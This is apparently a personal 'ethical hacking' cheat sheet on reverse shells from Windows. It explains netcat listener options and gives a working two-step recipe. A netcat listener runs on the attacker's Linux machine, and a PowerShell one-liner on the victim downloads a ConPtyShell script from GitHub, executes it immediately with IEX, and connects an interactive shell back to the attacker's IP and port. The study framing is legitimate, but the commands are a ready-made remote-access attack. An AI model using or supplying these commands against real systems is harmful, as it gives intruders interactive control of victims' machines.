# Ethical Hacking - Remote Access - Windows - Reverse Shell with Netcat

## Information
### DESCRIPTION
```
Reverse Shell on Windows is slightly different from Linux as Windows doesnt have netcat natively
- However, Windows does have Powershell
```

## Tools 
### Linux
+ stty
+ Netcat
+ Attacker System (Listening) : Outside of a firewall
+ Target/Victim System (Connecting) : Inside of a firewall
### Windows
+ powershell

## Netcat
### Synopsis/Syntax 
```console
sudo nc {options}
```
### Parameters
#### Listener/Server
+ -l : Start listening for connection; Listener Mode
+ -n : Do not use DNS; only use IP address
+ -v : Verbose Mode; Show detailed information
+ -p : Specify ports to listen on; Try to keep firewall within the well known ports (under 1000)
+ -s : Specify source (Attacker) IP address to listen with
#### Client
+ -e [command] : Execute a command; Generally will be the shell

## WorkFlow
> Method/Order of Operation
- Reverse Shell Remote Connection/Access
    1. Start listener (server) to listen for a connection (on Linux system)
	```console
	stty raw -echo; (stty size; cat) | nc -lvnp [listener-port] -s [listener-source-ip-address]
	```
    2. Download the script to initiate a connection back to listener (attacker)
	+ Connect to listener with target/victim (client) (on Windows system)
	+ This command is using Powershell
	```powershell
	IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [listener (attacker) IP Address] [listening-port-number]
	```

## References
+ [YouTube | NetworkChuck | how to get remote access to your hacking targets // reverse shells with netcat (Windows and Linux!!)](https://www.youtube.com/watch?v=bXCeFPNWjsM)

## Resources
+ [swisskyrepo/PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## Remarks
